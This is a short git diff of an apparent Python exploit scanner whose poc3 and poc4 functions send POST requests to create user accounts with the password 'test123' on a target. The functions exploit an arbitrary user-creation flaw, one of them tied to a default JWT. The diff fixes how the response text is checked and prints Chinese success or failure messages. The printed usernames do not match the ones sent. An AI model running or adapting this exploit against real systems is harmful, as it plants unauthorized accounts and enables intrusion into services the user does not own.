@@ -61,7 +61,7 @@ def poc3(url):
         "password": "test123"
     }
     checkpoc3 = requests.post(url=url + path, headers=head, data=data, verify=False)
-    if "create user ok" in checkpoc3:
+    if "create user ok" in checkpoc3.text:
         print(Fore.GREEN + "[+]用户:abc123 添加成功，密码为：test123")
     else:
         print(Fore.RED + "[-]不存在任意用户添加漏洞")
@@ -76,8 +76,8 @@ def poc4(url):
         "username": "test2",
         "password": "test123"
     }
-    checkpoc3 = requests.post(url=url + path, headers=head, data=data, verify=False)
-    if "create user ok" in checkpoc3:
+    checkpoc4 = requests.post(url=url + path, headers=head, data=data, verify=False)
+    if "create user ok" in checkpoc4.text:
         print(Fore.GREEN + "[+]用户:test1 添加成功，密码为：test123")
     else:
         print(Fore.RED + "[-]不存在默认JWT任意用户添加漏洞")
